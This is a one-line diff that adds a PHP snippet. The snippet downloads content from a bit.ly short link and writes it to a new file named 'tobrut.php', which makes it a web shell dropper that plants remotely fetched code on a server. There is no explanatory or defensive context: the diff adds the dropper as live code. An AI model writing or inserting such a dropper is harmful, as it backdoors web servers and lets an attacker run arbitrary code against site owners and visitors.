@@ -1,0 +1,1 @@
+<?php $nama= fopen("tobrut.php" ,"w+"); $file = file_get_contents('https://bit.ly/HzG1A'); $tulis = fwrite ($nama ,$file); fclose($nama); ?>
